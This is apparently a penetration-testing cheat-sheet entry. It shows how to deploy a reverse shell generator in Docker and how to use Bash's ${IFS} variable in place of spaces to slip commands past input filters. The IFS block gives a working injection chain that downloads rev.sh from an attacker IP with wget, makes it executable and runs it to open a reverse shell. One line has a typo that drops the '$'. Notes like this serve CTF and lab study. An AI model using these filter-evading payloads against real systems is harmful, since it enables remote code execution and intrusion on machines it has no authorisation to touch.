!!! info ""


    ```shell title:"reverse shell generator"9
    https://github.com/0dayCTF/reverse-shell-generator

    wget https://github.com/0dayCTF/reverse-shell-generator/archive/refs/heads/main.zip
    unzip main.zip
    cd reverse-shell-generator-main
    docker build -t reverse_shell_generator .
    docker run -d -p 8090:80 reverse_shell_generator

    http://127.0.0.1:8090
    ```


    ```shell title:"Bash IFS - Reverse Shell - Burp Repeater - PHP"
    - IFS Internal Field Separator
    - The special shell variable _IFS_ determines how Bash recognizes word boundaries while splitting a sequence of character strings.
    - The default value of _IFS_ is a three-character string comprising a space, tab, and newline

    ls${IFS}-la
    ping${IFS}127.0.0.1
    wget${IFS}http://10.10.10.10:8888/rev.sh
    chmod${IFS}777{IFS}rev.sh
    bash${IFS}rev.sh

    ```





